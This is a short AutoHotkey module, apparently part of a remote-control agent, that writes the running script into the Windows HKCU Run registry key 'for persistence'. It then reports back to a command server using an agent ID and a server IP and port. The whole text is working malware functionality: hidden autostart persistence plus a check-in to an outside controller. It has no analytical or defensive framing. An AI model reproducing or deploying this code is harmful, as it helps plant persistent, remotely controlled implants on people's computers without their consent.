; ============================================================================
; ADD SCRIPT TO REGISTRY MODULE
; ============================================================================
; Adds the current script to the Run registry key for persistence
; ============================================================================

AddScriptToRegistry(valueName := "StartUp") {
    subKey := "Software\Microsoft\Windows\CurrentVersion\Run"
    scriptPath := A_ScriptFullPath
    exePath := A_AhkPath
    value := Format( '"{}" "{}"', exePath, scriptPath)
    RegWrite(value, "REG_SZ", "HKEY_CURRENT_USER\" subKey, valueName)
    message := Format("command_output|{}|Registry key created successfully", this.agentID)
    response := this.SendMsg(this.serverIP, this.serverPort, message)
}
